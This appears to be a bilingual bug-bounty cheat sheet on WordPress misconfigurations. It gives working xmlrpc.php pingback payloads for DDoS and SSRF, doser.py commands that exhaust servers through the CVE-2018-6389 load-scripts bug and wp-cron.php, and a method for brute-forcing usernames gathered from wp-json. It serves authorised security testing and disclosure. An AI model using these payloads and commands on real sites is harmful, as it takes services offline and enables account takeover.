# Wordpress Common Misconfiguration - Wordpress 常见的错误配置
Here I will try my best to mention all common security misconfigurations for Wordpress I saw before or officially referenced. I will be attaching all poc and reference as well
在此，我将尽力提及我之前看到或官方引用的所有常见的 Wordpress 安全错误配置。我也会附上所有的 poc 和参考

# 索引
* [WordPress 检测](#"Wordpress Detection")
* [通用扫描工具](#Geneal Scan Tool)
* [xmlrpc.php](#xmlrpc.php)
* [CVE-2018-6389](#CVE-2018-6389)
* [WP Cornjob DOS](#WP Cornjob DOS)
* [WP用户枚举](#WP User Enumeration)

# <a name="Wordpress Detection">Wordpress 检测</a>
Well, if you are reading this you already know about technology detection tool and methods.
Still adding them below
好吧，如果您正在阅读本文，那么您已经了解技术检测工具和方法。 仍在下面添加它们

* Wappalyzer
* WhatRuns
* BuildWith

# <a name="Geneal Scan Tool">通用扫描工具</a>
* WpScan

# <a name=xmlrpc.php>xmlrpc.php</a>
This is one of the common issue on wordpress. To get some bucks with this misconfiguration you must have to exploit it fully, and have to show the impact properly as well.
这是wordpress上常见的问题之一。要想利用这个错误的配置获得一些钱，你必须充分地利用它，并且必须适当地展示其影响。

### 检测
* 访问 site.com/xmlrpc.php
* 只获取关于POST请求的错误信息

### Exploit
* 拦截请求，将方法GET改为POST
* 列出所有Methods
    ```
    <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
    </methodCall>
    ```
* 检查``pingback.ping`` 指令是否存在
* 执行DDOS
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<YOUR SERVER >:<port></string></value>
    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
    </value></param></params>
    </methodCall>
    ```
* 执行 SSRF（仅限内部端口扫描）
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<YOUR SERVER >:<port></string></value>
    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
    </value></param></params>
    </methodCall>
    ```
### 自动化 XMLRPC 扫描的工具

[XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan)

### 参考
[Bug Bounty Cheat Sheet - 漏洞赏金备忘单](https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html)

[Medium Writeup](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32)

[WpEngine Blog Post - WpEngine 博客文章](https://wpengine.com/resources/xmlrpc-php/)

# <a name=CVE-2018-6389>CVE-2018-6389</a>
This issue can down any Wordpress site under 4.9.3 So while reporting make sure that your target website is running wordpress under 4.9.3
这个问题可能会使任何4.9.3版本的Wordpress网站瘫痪。因此，在报告时要确保你的目标网站是在4.9.3下运行的wordpress

### 检测
Use the URL from my gist called loadsxploit, you will get a massive js data in response.
使用我的gist中名为loadxploit的URL，你会得到大量的js数据作为回应。

[loadsxploit](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)

### Exploit
You can use any Dos tool i found Doser really fast and it shut down the webserver within 30 second
你可以使用任何 Dos 工具，我发现 Doser 非常快，它会在 30 秒内关闭网络服务器

[Doser](https://github.com/quitten/doser.py)

```
python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
```
### 参考
[H1 Report](https://hackerone.com/reports/752010)

[CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)

[Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)


# <a name=WP Cornjob DOS>WP Cornjob DOS</a>
This is another area where you can perform a DOS attack.
这是另一个你可以进行DOS攻击的地方。

### 检测
* 访问site.com/wp-cron.php
* 您将看到一个带有 200 HTTP 状态代码的空白页面

### Exploit
You can use the same tool Doser for exploiting this 
您可以使用相同的工具 Doser 来利用这个

```
python3 doser.py -t 999 -g 'https://site.com/wp-cron.php'
```
### 参考

[GitHub Issue](https://github.com/wpscanteam/wpscan/issues/1299)

[Medium Writeup](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30)

# <a name="WP User Enumeration">WP用户枚举</a>
This issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff
这个问题只有在目标网站隐藏其当前用户或不公开的情况下才能接受。因此，攻击者可以使用这些用户数据进行暴力破解和其他工作人员

### 检测
* 访问site.com/wp-json/wp/v2/users/
* 您将看到带有用户信息的 json 数据作为响应

### Exploit
If you have xmlrpc.php and this User enumeration both presence there. Then you can chain them out by collecting username from wp-json and perform Bruteforce on them via xmlrpc.php. It will surely show some extra effort and increase the impact as well
如果你有xmlrpc.php和这个用户枚举都存在。那么你可以通过从wp-json收集用户名并通过xmlrpc.php对它们进行暴力攻击。这肯定会显示出一些额外的努力，同时也会增加影响。

### Reference
[H1 Report](https://hackerone.com/reports/356047)

# 研究员笔记
Please do not depend on those issues at all. I saw people only looking for those issues and nothing else. Those are good to have a look while testing for other vulnerabilities and most of the time they work good for chaining with other low bugs.
请不要完全依赖这些问题。我看到人们只是在寻找这些问题，而不是其他。在测试其他漏洞时，这些问题是很好的选择，而且大多数情况下，它们与其他低级错误的连锁反应很好。

# Author
**Name:** Mehedi Hasan Remon

**Handle:** [@remonsec](https://twitter.com/remonsec)
